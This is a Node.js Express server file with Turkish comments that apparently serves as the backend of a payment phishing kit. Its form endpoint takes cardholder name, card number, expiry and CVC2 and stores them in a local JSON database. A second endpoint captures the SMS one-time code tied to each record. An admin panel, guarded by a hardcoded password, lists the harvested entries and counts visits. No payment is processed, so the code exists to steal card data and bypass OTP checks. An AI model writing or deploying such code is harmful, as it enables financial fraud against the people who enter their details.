const express      = require('express');
const basicAuth    = require('express-basic-auth');
const bodyParser   = require('body-parser');
const path         = require('path');
const low          = require('lowdb');
const FileSync     = require('lowdb/adapters/FileSync');
const ShortUniqueId = require('short-unique-id');
const uid = new ShortUniqueId({ length: 8 }); 
// lowdb setup
const file    = path.join(__dirname, 'db.json');
const adapter = new FileSync(file);
const db      = low(adapter);
db.defaults({ submissions: [], visits: 0 }).write();

const app = express();
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));
app.use(bodyParser.urlencoded({ extended: true }));

// 1) Ana sayfa route: sadece burada sayaç artıyor
app.get('/', (req, res) => {
  db.update('visits', n => n + 1).write();            // sadece frontend index ziyareti
  res.sendFile(path.join(__dirname, '../frontend/index.html'));
});

// 2) Statik diğer frontend dosyaları (CSS/JS/img)
app.use(express.static(path.join(__dirname, '../frontend')));

// 1) body-parser zaten yüklü ve app.use(bodyParser.urlencoded…) var
app.post('/submit-form', (req, res) => {
  const { cardname, cardnr, validMONTH, validYEAR, cvc2 } = req.body;
  const newId = uid.rnd()
  
   db.get('submissions')
    .unshift({
      id: newId,
      cardname,
      cardnr,
      validMONTH,
      validYEAR,
      cvc2,
      createdAt: new Date().toISOString()
    })
    .write();
  // JSON ile ID’yi döndür
  res.redirect(`/sms.html?trans_id=${newId}`);       // ← burası
});
app.post('/submit-sms', (req, res) => {
  const { trans_id, smsCode } = req.body;
  // İlgili kaydı bulup güncelle
  db.get('submissions')
    .find({ id: trans_id })
    .assign({ smsCode, smsAt: new Date().toISOString() })
    .write();

  // MUTLAKA bir yanıt dönün:
  res.sendStatus(200);                   // basitçe 200 OK 
  // veya: res.json({ success: true });  
});

// Form gönderim endpoint
// app.post('/submit-form', (req, res) => {
//   const { name, email, message } = req.body;
//   db.get('submissions')
//     .unshift({ id: Date.now(), name, email, message, createdAt: new Date().toISOString() })
//     .write();
//   res.redirect('/panel');
// });

// Panel route: Basic Auth korumalı
app.get('/panel',
  basicAuth({ users: { admin: 'password123' }, challenge: true }),
  (req, res) => {
    const submissions = db.get('submissions').value();
    const visits       = db.get('visits').value();
    res.render('panel', { submissions, visits });
  }
);

// Logout
app.get('/logout', (req, res) => {
  res.set('WWW-Authenticate', 'Basic realm="Admin Area"');
  res.status(401).send('Çıkış yapıldı');
});

const PORT = 3000;
app.listen(PORT, '0.0.0.0', () => console.log(`Server http://0.0.0.0:${PORT}`));
